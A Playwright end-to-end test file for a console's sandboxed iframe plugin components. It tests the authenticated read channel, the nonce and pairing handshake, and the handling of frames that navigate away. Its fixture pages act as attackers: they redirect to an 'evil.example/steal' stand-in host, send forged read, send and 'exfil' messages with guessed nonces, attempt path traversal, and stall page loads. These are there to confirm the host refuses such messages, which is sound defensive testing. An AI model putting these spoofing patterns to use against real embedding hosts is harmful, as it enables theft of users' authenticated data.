import { expect, test, type Page } from "@playwright/test";

// Frame-rendered plugin component (ADR 0118 D5 console, S12b): a plugin contributes a
// component-v1 kind the console has NO built-in renderer for. The console resolves it through the
// live catalog (GET /api/components) to the plugin's FRAME page and hosts that page inline in the
// transcript (FrameComponentHost) — so the component renders WITH NO CONSOLE REBUILD. This drives
// the real stack end to end: a component-v1 part in the turn ("FRAMEKIND", e2e/fixtures.mjs) →
// ChatComponent's resolution order → FrameComponentHost's sandboxed iframe → the plugin-served
// frame page. Both the catalog and the frame page are route-mocked, so the console binary is
// unchanged — which is exactly the property under test.

// The catalog the console resolves component kinds through. `pl-demo-widget` is a frame kind (it
// carries a `frame_url`); the frame-less/core rows prove the console picks by name, not position.
const CATALOG = [
  { name: "pl-demo-widget", plugin: "demo", frame_url: "/plugins/demo/widget" },
  { name: "table", plugin: null, frame_url: null },
];

// The plugin-served page the resolved component renders in. A visible marker proves the frame's
// own markup is live; the height post is what the real plugin-kit sends so the host sizes to it.
const FRAME_HTML =
  "<!doctype html><html><body style='margin:0'>" +
  "<div id='frame-marker'>FRAME COMPONENT OK</div>" +
  "<script>parent.postMessage({ type: 'protoComponent:height', height: 120 }, '*');</script>" +
  "</body></html>";

async function withFrameComponent(page: Page) {
  await page.route("**/api/components", (route) => route.fulfill({ json: CATALOG }));
  await page.route("**/plugins/demo/widget*", (route) =>
    route.fulfill({ contentType: "text/html", body: FRAME_HTML }),
  );
}

test.beforeEach(async ({ page }) => {
  await withFrameComponent(page);
});

test("a plugin's frame component renders inline with no console rebuild", async ({ page }) => {
  await page.goto("/app/", { waitUntil: "load" });
  const composer = page.getByPlaceholder(/Message protoAgent/i);
  await composer.waitFor({ state: "visible" });
  await composer.fill("FRAMEKIND demo");
  await composer.press("Enter");

  // The turn settles; the component-v1 part resolves to a frame host in the transcript.
  await expect(page.locator(".pl-message--assistant").last()).toContainText("Here's the demo widget.");
  const host = page.getByTestId("frame-component-host");
  await expect(host).toBeVisible();
  // Bring the host into view so its near-viewport lazy mount fires (then the iframe exists).
  await host.scrollIntoViewIfNeeded();

  // It hosts the plugin's frame page (the catalog's frame_url) in a bearer-free, scripts-only
  // sandbox — deliberately NO allow-same-origin.
  const frame = host.locator("iframe");
  await expect(frame).toHaveAttribute("src", /\/plugins\/demo\/widget/);
  await expect(frame).toHaveAttribute("sandbox", "allow-scripts");

  // The plugin's OWN markup is live inside the frame — rendered without rebuilding the console.
  await expect(
    page.frameLocator('[data-testid="frame-component-host"] iframe').locator("#frame-marker"),
  ).toContainText("FRAME COMPONENT OK");
});

// Host-mediated read channel (ADR 0118 D5 amendment, #4143): the bearer-free frame asks its
// HOST to read one of its plugin's own GET routes. The kind declares `reads: ["features/*"]`, so
// the host serves `features/x` (an authed GET it makes itself) and refuses a deeper path, another
// plugin's route and core /api — and nothing the frame receives carries the operator's bearer.
const E2E_BEARER = "E2E-BEARER-never-in-the-frame";

// The fixture frame does exactly what a real frame component must (#4143 handshake): post
// `protoComponent:ready {pair}` once, echoing the `#pair=` fragment of its own URL; wait for the one
// `protoComponent:init`; keep the `nonce` it carries and echo it on every read.
const READ_FRAME_HTML =
  "<!doctype html><html><body style='margin:0'>" +
  "<pre id='read-out'>waiting</pre>" +
  "<script>" +
  "var results = {}; var started = false;" +
  "addEventListener('message', function (e) {" +
  "  var d = e.data;" +
  "  if (d && d.type === 'protoComponent:init' && !started) {" +
  "    started = true; var n = d.nonce;" +
  "    parent.postMessage({ type: 'protoComponent:read', cid: 1, path: 'features/x', nonce: n }, '*');" +
  "    parent.postMessage({ type: 'protoComponent:read', cid: 2, path: 'features/x/secret-sub', nonce: n }, '*');" +
  "    parent.postMessage({ type: 'protoComponent:read', cid: 3, path: '../other/features', nonce: n }, '*');" +
  "    parent.postMessage({ type: 'protoComponent:read', cid: 4, path: '/api/config', nonce: n }, '*');" +
  "    parent.postMessage({ type: 'protoComponent:read', cid: 5, path: 'features/x' }, '*');" +
  "    return;" +
  "  }" +
  "  if (!d || d.type !== 'protoComponent:readResult') return;" +
  "  results[d.cid] = d;" +
  "  document.getElementById('read-out').textContent = JSON.stringify(results);" +
  "});" +
  "parent.postMessage({ type: 'protoComponent:height', height: 160 }, '*');" +
  "parent.postMessage({ type: 'protoComponent:ready', pair: (location.hash.match(/pair=([0-9a-f]+)/) || [])[1] }, '*');" +
  "</script></body></html>";

test("a frame component reads its declared plugin route through the host, and nothing else", async ({ page }) => {
  await page.addInitScript((t) => window.localStorage.setItem("protoagent.authToken", t), E2E_BEARER);
  // Declare the read allowlist on the frame kind (overrides the beforeEach catalog route).
  await page.route("**/api/components", (route) =>
    route.fulfill({
      json: [{ name: "pl-demo-widget", plugin: "demo", frame_url: "/plugins/demo/widget", reads: ["features/*"] }],
    }),
  );
  await page.route("**/plugins/demo/widget*", (route) =>
    route.fulfill({ contentType: "text/html", body: READ_FRAME_HTML }),
  );
  const seen: { url: string; auth: string | undefined }[] = [];
  await page.route("**/api/plugins/demo/features/x", (route) => {
    seen.push({ url: route.request().url(), auth: route.request().headers()["authorization"] });
    return route.fulfill({ json: { id: "x", title: "Feature X", status: "in_progress" } });
  });
  // Any other demo/other plugin data route would be a leak — record it so the test fails loudly.
  // (Core /api/config is a normal console read, so its refusal is asserted on the result only.)
  const forbidden: string[] = [];
  await page.route(/\/api\/plugins\/(?:other\/|demo\/(?!features\/x$))/, (route) => {
    forbidden.push(route.request().url());
    return route.fulfill({ status: 500, json: { detail: "must not be fetched" } });
  });

  await page.goto("/app/", { waitUntil: "load" });
  const composer = page.getByPlaceholder(/Message protoAgent/i);
  await composer.waitFor({ state: "visible" });
  await composer.fill("FRAMEKIND demo");
  await composer.press("Enter");

  const host = page.getByTestId("frame-component-host");
  await expect(host).toBeVisible();
  await host.scrollIntoViewIfNeeded();

  const out = page.frameLocator('[data-testid="frame-component-host"] iframe').locator("#read-out");
  await expect(out).toContainText('"5"');
  const results = JSON.parse((await out.textContent()) || "{}") as Record<string, Record<string, unknown>>;

  // The allowlisted path is served — the host made an authed GET on the frame's behalf…
  expect(results["1"]).toMatchObject({ ok: true, status: 200, json: { id: "x", title: "Feature X" } });
  expect(seen).toHaveLength(1);
  expect(seen[0].auth).toBe(`Bearer ${E2E_BEARER}`);
  // …and a deeper path, another plugin's route and core /api are refused without a request.
  for (const cid of ["2", "3", "4"]) expect(results[cid]).toMatchObject({ ok: false, status: 0 });
  // …and a read without the mount's nonce is refused too.
  expect(results["5"]).toMatchObject({ ok: false, status: 0, error: "missing or invalid nonce" });
  expect(forbidden).toEqual([]);
  // The frame never sees the bearer (or any header) in what it was sent.
  expect(JSON.stringify(results)).not.toContain(E2E_BEARER);
  expect(JSON.stringify(results).toLowerCase()).not.toContain("authorization");
});

// A frame that NAVIGATES ITSELF must not take the plugin's reads with it (#4143 review F1): a
// WindowProxy keeps its identity across navigation, so `e.source` alone can't tell the plugin page
// from whatever replaced it. The plugin page reads once (with its nonce), then navigates to a
// third-party page that hammers protoComponent:read/send without (and with a guessed) nonce. The
// host must serve none of it, never hand the new page an init, and unload the frame.
const NAV_FRAME_HTML =
  "<!doctype html><html><body style='margin:0'><pre id='nav-out'>waiting</pre><script>" +
  "addEventListener('message', function (e) {" +
  "  var d = e.data;" +
  "  if (d && d.type === 'protoComponent:init') {" +
  "    parent.postMessage({ type: 'protoComponent:read', cid: 1, path: 'features/x', nonce: d.nonce }, '*');" +
  "  }" +
  "  if (d && d.type === 'protoComponent:readResult' && d.cid === 1) {" +
  "    document.getElementById('nav-out').textContent = 'FIRST ' + JSON.stringify(d);" +
  "    setTimeout(function () { location.href = 'https://evil.example/steal'; }, 50);" +
  "  }" +
  "});" +
  "parent.postMessage({ type: 'protoComponent:height', height: 120 }, '*');" +
  "parent.postMessage({ type: 'protoComponent:ready', pair: (location.hash.match(/pair=([0-9a-f]+)/) || [])[1] }, '*');" +
  "</script></body></html>";

const EVIL_HTML =
  "<!doctype html><html><body><script>" +
  "var i = 0;" +
  "function hit() {" +
  "  i += 1;" +
  "  parent.postMessage({ type: 'protoComponent:read', cid: 100 + i, path: 'features/secret' }, '*');" +
  "  parent.postMessage({ type: 'protoComponent:read', cid: 200 + i, path: 'features/secret', nonce: 'guess' }, '*');" +
  "  parent.postMessage({ type: 'protoComponent:send', cid: 300 + i, text: 'exfil', nonce: 'guess' }, '*');" +
  "}" +
  "hit(); setInterval(hit, 20);" +
  "</script></body></html>";

test("a frame that navigates away is refused every read and unloaded", async ({ page }) => {
  await page.route("**/api/components", (route) =>
    route.fulfill({
      json: [{ name: "pl-demo-widget", plugin: "demo", frame_url: "/plugins/demo/widget", reads: ["features/*"] }],
    }),
  );
  await page.route("**/plugins/demo/widget*", (route) => route.fulfill({ contentType: "text/html", body: NAV_FRAME_HTML }));
  await page.route("https://evil.example/**", (route) => route.fulfill({ contentType: "text/html", body: EVIL_HTML }));
  let firstReads = 0;
  await page.route("**/api/plugins/demo/features/x", (route) => {
    firstReads += 1;
    return route.fulfill({ json: { id: "x" } });
  });
  let stolen = 0;
  await page.route("**/api/plugins/demo/features/secret", (route) => {
    stolen += 1;
    return route.fulfill({ json: { private: "board data" } });
  });

  await page.goto("/app/", { waitUntil: "load" });
  const composer = page.getByPlaceholder(/Message protoAgent/i);
  await composer.waitFor({ state: "visible" });
  await composer.fill("FRAMEKIND demo");
  await composer.press("Enter");
  const host = page.getByTestId("frame-component-host");
  await expect(host).toBeVisible();
  await host.scrollIntoViewIfNeeded();

  // The first (plugin) document works…
  await expect.poll(() => firstReads).toBe(1);
  // …then it navigates itself: the host notices the second load, revokes the capability and
  // unloads the frame for a "navigated away" notice.
  await expect(page.getByTestId("frame-component-navigated")).toBeVisible();
  await expect(host.locator("iframe")).toHaveCount(0);
  await page.waitForTimeout(300);
  expect(stolen).toBe(0);
  expect(firstReads).toBe(1);
  await expect(page.getByTestId("component-send-confirm")).toHaveCount(0);
});

// The two re-review races (#4143): the init used to be pushed on load + re-posted on a timer, so a
// replacing page could be handed the nonce. Now init is pulled ONCE by a ready that must echo the
// `#pair=` fragment only the declared page's URL carries.
async function openFrameKind(page: Page) {
  await page.goto("/app/", { waitUntil: "load" });
  const composer = page.getByPlaceholder(/Message protoAgent/i);
  await composer.waitFor({ state: "visible" });
  await composer.fill("FRAMEKIND demo");
  await composer.press("Enter");
  const host = page.getByTestId("frame-component-host");
  await expect(host).toBeVisible();
  await host.scrollIntoViewIfNeeded();
  return host;
}

// A replacing page: it can't know the pair or the nonce, so it tries everything it can.
const GREEDY_HTML =
  "<!doctype html><html><body><script>" +
  "var nonce = null;" +
  "addEventListener('message', function (e) {" +
  "  if (e.data && e.data.type === 'protoComponent:init') nonce = e.data.nonce;" +
  "});" +
  "parent.postMessage({ type: 'protoComponent:ready' }, '*');" +
  "var i = 0; setInterval(function () { i += 1;" +
  "  parent.postMessage({ type: 'protoComponent:read', cid: i, path: 'features/secret', nonce: nonce }, '*');" +
  "  parent.postMessage({ type: 'protoComponent:openLink', cid: 1000 + i, url: 'https://evil.example/x', nonce: nonce }, '*');" +
  "}, 20);" +
  "</script>" +
  // (b): hold this page's own `load` open forever, so a second load is never observed.
  "<img src='https://evil.example/hang.png'>" +
  "</body></html>";

async function routeRace(page: Page, frameHtml: string) {
  await page.route("**/api/components", (route) =>
    route.fulfill({
      json: [{ name: "pl-demo-widget", plugin: "demo", frame_url: "/plugins/demo/widget", reads: ["features/*"] }],
    }),
  );
  await page.route("**/plugins/demo/widget*", (route) => route.fulfill({ contentType: "text/html", body: frameHtml }));
  await page.route("https://evil.example/hang.png", () => {
    /* never answered: the replacing page's load never fires */
  });
  await page.route("https://evil.example/steal", (route) => route.fulfill({ contentType: "text/html", body: GREEDY_HTML }));
  const hits = { secret: 0 };
  await page.route("**/api/plugins/demo/features/secret", (route) => {
    hits.secret += 1;
    return route.fulfill({ json: { private: "board data" } });
  });
  await page.route("**/api/plugins/demo/features/x", (route) => route.fulfill({ json: { id: "x" } }));
  return hits;
}

test("(a) a page that navigates while still parsing never gets the capability", async ({ page }) => {
  // The declared page navigates BEFORE it ever posts ready — so the iframe sees one load, the
  // replacing page's, exactly like the plugin page itself.
  const hits = await routeRace(
    page,
    "<!doctype html><html><body><script>location.href = 'https://evil.example/steal';</script></body></html>",
  );
  await openFrameKind(page);
  // The replacing page's unpaired ready revokes the mount.
  await expect(page.getByTestId("frame-component-navigated")).toBeVisible();
  await page.waitForTimeout(300);
  expect(hits.secret).toBe(0);
  await expect(page.getByTestId("component-open-confirm")).toHaveCount(0);
});

test("(b) a page that navigates after init and stalls its own load never gets the capability", async ({ page }) => {
  // The declared page pairs, gets its init, then navigates ~at once (inside the old re-post
  // window); the replacing page holds its own load open forever.
  const hits = await routeRace(
    page,
    "<!doctype html><html><body><script>" +
      "addEventListener('message', function (e) {" +
      "  if (e.data && e.data.type === 'protoComponent:init') setTimeout(function () { location.href = 'https://evil.example/steal'; }, 50);" +
      "});" +
      "parent.postMessage({ type: 'protoComponent:ready', pair: (location.hash.match(/pair=([0-9a-f]+)/) || [])[1] }, '*');" +
      "</script></body></html>",
  );
  await openFrameKind(page);
  await expect(page.getByTestId("frame-component-navigated")).toBeVisible();
  await page.waitForTimeout(1_800); // well past the old 1.5 s re-post schedule
  expect(hits.secret).toBe(0);
  await expect(page.getByTestId("component-open-confirm")).toHaveCount(0);
});
